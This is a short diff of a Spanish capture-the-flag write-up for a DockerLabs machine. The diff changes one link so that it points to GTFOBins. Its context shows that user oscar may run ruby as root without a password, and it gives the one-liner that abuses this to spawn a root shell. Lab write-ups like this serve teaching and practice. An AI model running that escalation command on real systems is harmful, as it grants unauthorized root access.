@@ -112,7 +112,7 @@ User oscar may run the following commands on 6ba86e9dc48a:
     (ALL) NOPASSWD: /usr/bin/ruby
 ```
 
-Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins](https://github.com/albertomarcostic/DockerLabs-WriteUps/blob/main)
+Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/)
 
 ```shell
 sudo /usr/bin/ruby -e 'exec "/bin/bash"'
